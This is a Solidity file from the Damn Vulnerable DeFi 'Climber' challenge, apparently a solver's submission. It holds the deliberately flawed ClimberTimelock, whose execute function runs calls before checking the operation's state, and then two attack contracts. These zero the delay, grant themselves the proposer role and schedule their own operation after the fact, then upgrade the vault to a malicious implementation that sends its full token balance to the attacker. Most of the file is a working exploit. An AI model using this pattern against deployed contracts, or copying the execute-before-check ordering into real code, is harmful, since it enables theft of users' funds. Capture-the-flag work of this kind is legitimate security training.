// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberVault.sol";

/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberTimelock is AccessControl {
    using Address for address;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    // Possible states for an operation in this timelock contract
    enum OperationState {
        Unknown,
        Scheduled,
        ReadyForExecution,
        Executed
    }

    // Operation data tracked in this contract
    struct Operation {
        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution
        bool known;         // whether the operation is registered in the timelock
        bool executed;      // whether the operation has been executed
    }

    // Operations are tracked by their bytes32 identifier
    mapping(bytes32 => Operation) public operations;

    uint64 public delay = 1 hours;

    constructor(
        address admin,
        address proposer
    ) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);

        // deployer + self administration
        _setupRole(ADMIN_ROLE, admin);
        _setupRole(ADMIN_ROLE, address(this));

        _setupRole(PROPOSER_ROLE, proposer);
    }

    function getOperationState(bytes32 id) public view returns (OperationState) {
        Operation memory op = operations[id];
        
        if(op.executed) {
            return OperationState.Executed;
        } else if(op.readyAtTimestamp >= block.timestamp) {
            return OperationState.ReadyForExecution;
        } else if(op.readyAtTimestamp > 0) {
            return OperationState.Scheduled;
        } else {
            return OperationState.Unknown;
        }
    }

    function getOperationId(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) public pure returns (bytes32) {
        return keccak256(abi.encode(targets, values, dataElements, salt));
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        require(targets.length > 0 && targets.length < 256);
        require(targets.length == values.length);
        require(targets.length == dataElements.length);

        bytes32 id = getOperationId(targets, values, dataElements, salt);
        require(getOperationState(id) == OperationState.Unknown, "Operation already known");
        
        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
        operations[id].known = true;
    }

    /** Anyone can execute what has been scheduled via `schedule` */
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable {
        require(targets.length > 0, "Must provide at least one target");
        require(targets.length == values.length);
        require(targets.length == dataElements.length);

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; i++) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }
        
        require(getOperationState(id) == OperationState.ReadyForExecution);
        operations[id].executed = true;
    }

    function updateDelay(uint64 newDelay) external {
        require(msg.sender == address(this), "Caller must be timelock itself");
        require(newDelay <= 14 days, "Delay must be 14 days or less");
        delay = newDelay;
    }

    receive() external payable {}
}
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberVaultCompromised is ClimberVault{
    function attack(address _tokenAddress, address _attacker) external{
        IERC20 _token = IERC20(_tokenAddress);
        require(_token.transfer(_attacker, _token.balanceOf(address(this))), "Transfer failed");
    }
}
contract AttackClimber {
    ClimberTimelock public timelock;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 salt = keccak256(abi.encode(0));
    constructor(address payable _timelock) {
        timelock = ClimberTimelock(payable(_timelock));
    }
    function _getDataElements(
        address[] memory _targets, 
        uint256[] memory _values
    ) internal view returns(bytes[] memory){
        bytes[] memory _dataElements = new bytes[](3);
        _dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        _dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));
        _dataElements[2] = abi.encodeWithSelector(AttackClimber.schedule.selector, _targets, _values);
        return(_dataElements);
    }
    function attack (
        address _newImplementation,
        address[] memory _targets, 
        uint256[] memory _values,
        address _vault,
        address _token
    ) external {
        address[] memory _target = new address[](1);
        uint256[] memory _value = new uint256[](1);
        bytes[] memory _dataElement = new bytes[](1);
        _target[0] = _vault;
        _value[0] = 0;
        _dataElement[0] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
             _newImplementation,
             abi.encodeWithSelector(ClimberVaultCompromised.attack.selector, _token, msg.sender)
        );
        timelock.execute(
            _targets,
            _values,
            _getDataElements(_targets, _values),
            salt
        );
        timelock.schedule(
            _target,
            _value,
            _dataElement,
            salt
        );
        timelock.execute(
            _target,
            _value,
            _dataElement,
            salt
        );
    }
    function schedule(
        address[] memory _targets,
        uint256[] memory _values
    ) external {
        timelock.schedule(
            _targets,
            _values,
            _getDataElements(_targets, _values),
            salt
        );
    }
}


